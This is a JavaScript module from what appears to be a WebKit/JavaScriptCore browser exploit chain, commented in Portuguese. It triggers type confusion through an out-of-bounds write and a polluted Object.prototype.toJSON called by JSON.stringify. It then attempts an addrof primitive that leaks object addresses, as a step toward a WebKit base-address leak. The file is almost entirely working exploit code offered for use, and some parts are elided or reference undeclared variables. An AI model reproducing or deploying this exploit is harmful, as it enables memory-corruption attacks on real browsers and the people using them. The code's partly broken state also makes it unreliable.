// js/script3/testArrayBufferVictimCrash.mjs (R43L - TC Controlada + Addrof em M2.payload)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_TCControlAddrof";

const VICTIM_TA_SIZE_ELEMENTS = 8; // Para o TypedArray que vai no JSON.stringify
const M2_PAYLOAD_TA_SIZE_ELEMENTS = 2; // Para o TypedArray dentro de M2, onde tentaremos o addrof

const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; // Offset que causa TC
const OOB_WRITE_VALUE_FOR_TC = 0xABABABAB; // Valor que causa TC

const FILL_PATTERN_M2_PAYLOAD = 0xC0CAC01A; // Padrão para o TA em M2
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak_tc_control; // Função alvo para addrof
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração, com logs) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    return toHex(value);
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC Controlada + Addrof em M2.payload ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init TCControl...`;

    targetFunctionForLeak_tc_control = function someUniqueLeakFunctionR43L_TCControl() { return `target_R43L_TCControl_${Date.now()}`; };

    logS3(`--- Fase 0 (TCControl): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }

    let result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (TCControl): Não iniciado.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (TCControl): Não iniciado." },
        oob_params_used: { offset: safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: safeToHex(OOB_WRITE_VALUE_FOR_TC) },
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        m2_payload_addrof_details: null
    };
    
    // Variáveis da closure da sonda
    let victim_ta_for_json_trigger = null; // O que vai para JSON.stringify
    let m1_ref_for_sondar = null;
    let m2_object_for_sondar = null; // O objeto que esperamos que 'this' se torne

    // Detalhes do addrof tentado em M2.payload_ta
    let m2_payload_addrof_attempt_details = {
        notes: "Não executado",
        payload_ta_found_in_m2: false,
        addrof_on_payload_ta_successful: false,
        leaked_address_str: null
    };

    let probe_call_count_iter = 0;
    let iteration_tc_first_detection_done = false;
    let heisenbugConfirmedThisIter = false;

    function toJSON_TA_Probe_Iter_Closure_TCControl() {
        probe_call_count_iter++; const call_num = probe_call_count_iter;
        const ctts = Object.prototype.toString.call(this);
        const is_m2c = (this === m2_object_for_sondar && m2_object_for_sondar !== null);

        try {
            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };

            if (call_num === 1 && this === victim_ta_for_json_trigger) {
                logS3(`[PROBE_TCControl] Call #${call_num}: 'this' é victim_ta_for_json_trigger. Configurando M1/M2...`, "debug");
                
                let m2_payload_ta = new Uint32Array(M2_PAYLOAD_TA_SIZE_ELEMENTS);
                m2_payload_ta.fill(FILL_PATTERN_M2_PAYLOAD);
                
                m2_object_for_sondar = { 
                    id: "M2_TC_CONTROL", 
                    payload_ta: m2_payload_ta, // TypedArray onde tentaremos o addrof
                    some_other_prop: "test_value"
                };
                logS3(`   m2_object_for_sondar criado com payload_ta (len: ${m2_payload_ta.length}).`, "debug_detail");

                m1_ref_for_sondar = { marker_id_tc_control: "M1_TCControl", payload_M2_obj: m2_object_for_sondar };
                return m1_ref_for_sondar;

            } else if (is_m2c) { // `this` é m2_object_for_sondar
                if (!iteration_tc_first_detection_done) {
                    iteration_tc_first_detection_done = true;
                    heisenbugConfirmedThisIter = true;
                    result_for_runner.tc_probe_details = { /* ... */ this_is_M2: true, notes: "TC Confirmada. 'this' é m2_object_for_sondar."};
                    logS3(`[PROBE_TCControl] Call #${call_num} (M2C): FIRST TC. 'this' é m2_object_for_sondar (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                    logS3(`   Propriedades de 'this' (m2_object_for_sondar): id=${this.id}, some_other_prop=${this.some_other_prop}`, "info");

                    // Verificar se payload_ta está acessível e é um TypedArray
                    if (this.payload_ta && typeof this.payload_ta.fill === 'function' && this.payload_ta.length === M2_PAYLOAD_TA_SIZE_ELEMENTS) {
                        logS3(`   'this.payload_ta' (m2_object_for_sondar.payload_ta) está acessível e parece ser o TypedArray esperado.`, "good");
                        m2_payload_addrof_attempt_details.payload_ta_found_in_m2 = true;

                        // TENTATIVA DE ADDROF no this.payload_ta USANDO victim_ta_for_json_trigger como scratchpad
                        // Isso só funciona se victim_ta_for_json_trigger ainda for um ArrayBuffer/TypedArray válido
                        // e se a escrita de objeto nele não resultar em NaN.
                        if (victim_ta_for_json_trigger && victim_ta_for_json_trigger.buffer && victim_ta_for_json_trigger.buffer.byteLength >= 8) {
                            logS3(`   Tentando addrof de 'this.payload_ta' usando 'victim_ta_for_json_trigger' como scratchpad...`, "info_emphasis");
                            let scratchpad_float_view = new Float64Array(victim_ta_for_json_trigger.buffer);
                            let scratchpad_uint32_view = new Uint32Array(victim_ta_for_json_trigger.buffer);
                            const prev_val_low = scratchpad_uint32_view[0];
                            const prev_val_high = scratchpad_uint32_view[1];

                            try {
                                scratchpad_float_view[0] = this.payload_ta; // Tentar vazar o endereço do TypedArray payload_ta
                                
                                if (typeof scratchpad_float_view[0] === 'number' && isNaN(scratchpad_float_view[0])) {
                                     logS3(`   AVISO: scratchpad_float_view[0] se tornou NaN após atribuir this.payload_ta.`, "warn");
                                } else if (scratchpad_float_view[0] !== this.payload_ta) {
                                     logS3(`   AVISO: scratchpad_float_view[0] !== this.payload_ta após atribuição. Tipo: ${typeof scratchpad_float_view[0]}`, "warn");
                                }


                                const leaked_low = scratchpad_uint32_view[0];
                                const leaked_high = scratchpad_uint32_view[1];
                                const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
                                m2_payload_addrof_attempt_details.leaked_address_str = potential_addr.toString(true);

                                logS3(`   Raw Addrof de this.payload_ta: L=0x${leaked_low.toString(16)}, H=0x${leaked_high.toString(16)} -> ${potential_addr.toString(true)}`, "leak");

                                if (isValidPointer(potential_addr, "_m2PayloadTAAddrof")) {
                                    leaked_target_function_addr = potential_addr; // Usando a variável global para consistência com WebKitLeak
                                    m2_payload_addrof_attempt_details.addrof_on_payload_ta_successful = true;
                                    m2_payload_addrof_attempt_details.notes = "Addrof em this.payload_ta BEM SUCEDIDO!";
                                    logS3(`   !!! ADDROF DE this.payload_ta BEM SUCEDIDO: ${potential_addr.toString(true)} !!!`, "success_major");
                                    
                                    // Atualizar resultado principal do addrof
                                    result_for_runner.addrof_result.success = true;
                                    result_for_runner.addrof_result.msg = "Addrof de M2.payload_ta via TC bem sucedido.";
                                    result_for_runner.addrof_result.leaked_object_addr = potential_addr.toString(true);

                                } else {
                                    m2_payload_addrof_attempt_details.notes = "Endereço vazado de this.payload_ta não é ponteiro válido.";
                                    logS3(`   Endereço vazado de this.payload_ta (${potential_addr.toString(true)}) não é ponteiro válido.`, "warn");
                                }
                            } catch (e_addrof) {
                                m2_payload_addrof_attempt_details.notes = `Exceção durante addrof em payload_ta: ${e_addrof.message}`;
                                logS3(`   Exceção durante addrof em this.payload_ta: ${e_addrof.message}`, "error");
                            } finally {
                                scratchpad_uint32_view[0] = prev_val_low; // Restaurar scratchpad
                                scratchpad_uint32_view[1] = prev_val_high;
                            }
                        } else {
                            m2_payload_addrof_attempt_details.notes = "Scratchpad (victim_ta_for_json_trigger) inválido para tentativa de addrof.";
                            logS3(`   Scratchpad (victim_ta_for_json_trigger) inválido para tentativa de addrof.`, "error");
                        }
                    } else {
                        m2_payload_addrof_attempt_details.notes = "'this.payload_ta' não encontrado ou não é o TypedArray esperado em m2_object_for_sondar.";
                        logS3(`   'this.payload_ta' não encontrado ou tipo inesperado em m2_object_for_sondar. Tipo: ${typeof this.payload_ta}`, "error");
                    }
                }
                // Retornar 'this' (m2_object_for_sondar) para JSON.stringify serializar suas propriedades (id, some_other_prop, payload_ta)
                // Evita erros se JSON.stringify tentar acessar propriedades que só existiriam no victim_ta_for_json_trigger original.
                return this; 
            }
        } catch (e_pm) { /* ... */ }
        return { gen_m: call_num, type: ctts };
    }

    let iter_primary_error = null;
    // ... (declarações de iter_raw_stringify_output, iter_stringify_output_parsed)

    try {
        logS3(`  --- Fase 1 (TCControl): Configuração e Trigger da TC ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
        // Não precisa preencher victim_ta_for_json_trigger, será usado como scratchpad.
        logS3(`   victim_ta_for_json_trigger (scratchpad) criado. Length: ${victim_ta_for_json_trigger.length}`, "info");

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE_FOR_TC, 4);
        logS3(`   OOB Write: ${safeToHex(OOB_WRITE_VALUE_FOR_TC)} @ ${safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
        await PAUSE_S3(150);

        logS3(`  --- Tentativa de Detecção de TC e Addrof em M2.payload (TCControl) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_TCControl, writable: true, configurable: true, enumerable: false });
            polluted = true;
            iter_raw_stringify_output = JSON.stringify(victim_ta_for_json_trigger);
            try { result_for_runner.stringifyResult = JSON.parse(iter_raw_stringify_output); } catch (e_p) { result_for_runner.stringifyResult = { err_parse: iter_raw_stringify_output }; }

            result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = heisenbugConfirmedThisIter;
            if (heisenbugConfirmedThisIter) {
                logS3(`  TC Probe (TCControl): TC CONFIRMADA. 'this' tornou-se m2_object_for_sondar.`, "vuln");
            } else {
                logS3(`  TC Probe (TCControl): TC NÃO Confirmada.`, "warn");
            }
        } catch (e_str) {
            if (!iter_primary_error) iter_primary_error = e_str;
            logS3(`  TC Probe (TCControl): JSON.stringify EXCEPTION: ${e_str.message}`, "error");
        } finally {
            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
        }
        
        result_for_runner.m2_payload_addrof_details = m2_payload_addrof_attempt_details;
        if (m2_payload_addrof_attempt_details.addrof_on_payload_ta_successful) {
             logS3(`  Addrof em M2.payload_ta teve sucesso: ${m2_payload_addrof_attempt_details.leaked_address_str}`, "success_major");
        } else {
             logS3(`  Addrof em M2.payload_ta falhou. Notas: ${m2_payload_addrof_attempt_details.notes}`, "warn");
        }
        
        logS3(`  --- Fase de TC e Addrof em M2.payload Concluída. TC: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        await PAUSE_S3(100);

        // Tentar WebKitLeak se addrof em m2.payload_ta teve sucesso
        if (m2_payload_addrof_attempt_details.addrof_on_payload_ta_successful && leaked_target_function_addr) {
            logS3(`  --- Fase 2 (TCControl): Teste de WebKit Base Leak (usando addr de M2.payload_ta) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
            // ... (lógica do WebKit Leak, como nos scripts anteriores, usando leaked_target_function_addr)
            // Esta seção assume que leaked_target_function_addr contém o endereço do M2.payload_ta.
            // Para vazar a base do WebKit, normalmente precisaríamos do endereço de uma *função*.
            // Esta lógica precisaria ser adaptada se o objetivo for vazar WebKit base a partir do endereço de um TypedArray.
            // Por agora, vamos logar que precisaríamos do endereço de uma função.
            logS3(`   WebKitLeak: Addrof de M2.payload_ta (${leaked_target_function_addr.toString(true)}) obtido. Para WebKit base leak, normalmente precisaríamos do endereço de uma função.`, "info_emphasis");
            result_for_runner.webkit_leak_result.msg = "Addrof de M2.payload_ta obtido, mas não é endereço de função para WebKit leak padrão.";
            // Se você adaptar o exploit para usar o endereço do TypedArray para o WebKit leak, coloque a lógica aqui.
            // Por exemplo, se este TypedArray contiver ponteiros para código ou outras estruturas JSC.

        } else if (leaked_target_function_addr) {
             logS3(`   WebKitLeak pulado: addrof em M2.payload_ta falhou, mas leaked_target_function_addr tem valor: ${leaked_target_function_addr.toString(true)} (Inconsistente?)`, "warn");
        }
         else {
            logS3(`   WebKitLeak pulado: addrof em M2.payload_ta falhou.`, "warn");
        }


    } catch (e_outer_iter) {
        if (!iter_primary_error) iter_primary_error = e_outer_iter;
        result_for_runner.errorOccurred = e_outer_iter.message || String(e_outer_iter);
        logS3(`  CRITICAL ERROR ITERATION TCControl: ${result_for_runner.errorOccurred}`, "critical", FNAME_CURRENT_TEST_BASE);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    final_probe_call_count_for_report = probe_call_count_iter;
    result_for_runner.total_probe_calls_last_iter = final_probe_call_count_for_report; // Para o runner
    // Para compatibilidade com o runner (mesmo que haja apenas uma "iteração" de OOB params)
    result_for_runner.iteration_results_summary = [{
        oob_value: safeToHex(OOB_WRITE_VALUE_FOR_TC),
        error: result_for_runner.errorOccurred,
        tc_probe_details: result_for_runner.tc_probe_details,
        stringifyResult: result_for_runner.stringifyResult,
        addrof_result_this_iter: result_for_runner.addrof_result,
        webkit_leak_result_this_iter: result_for_runner.webkit_leak_result,
        heisenbug_on_M2_confirmed_by_tc_probe: result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        m2_payload_addrof_details: result_for_runner.m2_payload_addrof_details // Adicionar ao sumário da iteração
    }];
    result_for_runner.oob_value_of_best_result = safeToHex(OOB_WRITE_VALUE_FOR_TC);
    result_for_runner.heisenbug_on_M2_in_best_result = result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe;


    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (TCControl): ${JSON.stringify(result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
    if (result_for_runner.addrof_result.success) {
        final_title_status = "Addrof M2.payload SUCCESS!";
    } else if (result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
        final_title_status = "TC Confirmed, Addrof M2.payload Fail";
    } else if (result_for_runner.errorOccurred) {
        final_title_status = `Error - ${result_for_runner.errorOccurred}`;
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return result_for_runner;
}
